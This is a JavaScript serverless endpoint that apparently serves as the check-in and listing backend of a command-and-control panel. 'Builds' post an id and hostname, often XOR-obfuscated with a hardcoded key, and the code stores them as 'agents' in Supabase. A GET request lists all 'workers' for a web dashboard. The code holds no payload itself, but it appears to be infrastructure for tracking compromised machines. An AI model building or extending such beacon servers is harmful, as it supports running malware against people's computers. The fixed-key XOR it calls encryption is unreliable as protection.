import { createClient } from '@supabase/supabase-js';

// Инициализация Supabase через переменные окружения
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_ANON_KEY
);

// XOR encryption/decryption
const ENCRYPTION_KEY = 'k5gchqtcucmgcoxdz15sl';

function xorEncrypt(data, key) {
  let result = '';
  for (let i = 0; i < data.length; i++) {
    result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return result;
}

function xorDecrypt(data, key) {
  return xorEncrypt(data, key); // XOR is symmetric
}

function toHex(str) {
  let hex = '';
  for (let i = 0; i < str.length; i++) {
    hex += str.charCodeAt(i).toString(16).padStart(2, '0');
  }
  return hex;
}

function fromHex(hex) {
  let str = '';
  for (let i = 0; i < hex.length; i += 2) {
    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
  }
  return str;
}

export default async function handler(req, res) {
  // Добавляем CORS, чтобы можно было обращаться из браузера и билда
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Encrypted');

  if (req.method === 'OPTIONS') return res.status(200).end();

  // Логика POST: Билд присылает данные о себе
  if (req.method === 'POST') {
    let body = req.body;
    
    // Decrypt if encrypted
    if (req.headers['x-encrypted'] === 'true') {
      try {
        const encryptedHex = typeof body === 'string' ? body : JSON.stringify(body);
        const decrypted = xorDecrypt(fromHex(encryptedHex), ENCRYPTION_KEY);
        body = JSON.parse(decrypted);
      } catch (e) {
        return res.status(400).json({ error: 'Decryption failed' });
      }
    }
    
    const { id, hostname } = body;
    if (!id) return res.status(400).json({ error: 'No ID provided' });

    const { error } = await supabase
      .from('agents')
      .upsert({ 
        id, 
        hostname: hostname || 'Unknown', 
        last_seen: new Date().toISOString() 
      });

    if (error) return res.status(500).json(error);
    
    // Send encrypted response if client sent encrypted request
    if (req.headers['x-encrypted'] === 'true') {
      const response = JSON.stringify({ status: 'ok' });
      const encrypted = toHex(xorEncrypt(response, ENCRYPTION_KEY));
      return res.status(200).json({ encrypted: true, data: encrypted });
    }
    
    return res.status(200).json({ status: 'ok' });
  }

  // Логика GET: Сайт запрашивает список всех воркеров
  const { data: agents, error } = await supabase
    .from('agents')
    .select('*')
    .order('last_seen', { ascending: false });

  if (error) return res.status(500).json(error);
  return res.status(200).json(agents);
}